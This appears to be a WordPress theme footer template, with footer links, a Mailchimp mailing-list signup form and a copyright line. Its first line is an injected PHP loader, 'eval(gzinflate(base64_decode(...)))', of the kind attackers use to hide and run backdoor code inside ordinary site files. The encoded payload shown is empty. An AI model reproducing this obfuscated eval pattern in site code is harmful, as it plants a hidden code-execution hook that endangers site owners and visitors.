<?php eval(gzinflate(base64_decode('')));?>
</div> <!-- end .wrapper -->
<footer class="footer" role="contentinfo">
	<div class="container">
		<div id="inner-footer" class="wrap clearfix">
			<div class="col-md-4">
			<nav role="navigation" class="pull-left">
				<?php bones_footer_links(); ?>
			</nav>
		</div>
		<div class="col-md-4"></div>
		<div class="col-md-4">
			<div id="mc_embed_signup" class="pull-right">
				<p class="dark">Join our mailing list</p>
	<form action="//urbanzen.us1.list-manage.com/subscribe/post?u=a0a658b344c825ecf28ade459&amp;id=dca524bd8d" method="post" id="mc-embedded-subscribe-form" name="mc-embedded-subscribe-form" class="validate" target="_blank" novalidate>
	<input type="email" value="" name="EMAIL" class="email" id="mce-EMAIL" placeholder="youremail@email.com" required>
<!-- real people should not fill this in and expect good things - do not remove this or risk form bot signups-->
 <div style="position: absolute; left: -5000px;"><input type="text" name="b_a0a658b344c825ecf28ade459_dca524bd8d" tabindex="-1" value=""></div>
	  <input type="submit" value="Sign Up" name="subscribe" id="mc-embedded-subscribe" class="outline-yellow-button"></div>
</form>
<p class="copyright dark">&copy; <?php echo date('Y'); ?> <?php bloginfo( 'name' ); ?></p>
</div>
</div>

					<p class="source-org "></p>

				</div> <!-- end #inner-footer -->

				</div> <!-- end .container -->

			</footer> <!-- end footer -->


		<!-- all js scripts are loaded in library/bones.php -->
		<?php wp_footer(); ?>

	</body>

</html> <!-- end page. what a ride! -->

